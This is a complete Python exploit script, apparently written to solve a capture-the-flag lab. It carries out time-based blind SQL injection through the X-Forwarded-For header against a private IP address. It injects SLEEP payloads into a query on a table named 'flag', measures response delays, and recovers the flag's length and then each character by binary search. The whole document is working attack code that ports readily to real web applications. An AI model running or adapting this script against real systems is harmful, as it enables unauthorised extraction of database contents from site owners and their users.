#!/usr/bin/env python3
"""Time-based blind SQLi extraction via X-Forwarded-For header."""
import urllib.request
import time

TARGET = "http://10.66.162.44/"

def inject(payload):
    """Execute a time-based payload via X-Forwarded-For, return True if delayed."""
    hdr = f"1';(SELECT SLEEP(0.5) FROM sqhell_1.flag WHERE {payload})#"
    req = urllib.request.Request(TARGET, headers={"X-Forwarded-For": hdr})
    start = time.time()
    try:
        urllib.request.urlopen(req, timeout=10)
    except:
        pass
    elapsed = time.time() - start
    return elapsed > 0.4  # threshold for 0.5s sleep

def extract_flag():
    flag = ""
    # First get length
    for length in range(1, 100):
        if inject(f"LENGTH(flag)={length}"):
            print(f"[+] Flag length: {length}")
            break
    else:
        print("[-] Could not determine flag length")
        return

    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            if inject(f"ASCII(SUBSTRING(flag,{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid - 1
        char = chr(lo)
        flag += char
        print(f"[+] Pos {pos}: '{char}' -> {flag}")
    print(f"\n[+] FLAG: {flag}")

if __name__ == "__main__":
    extract_flag()
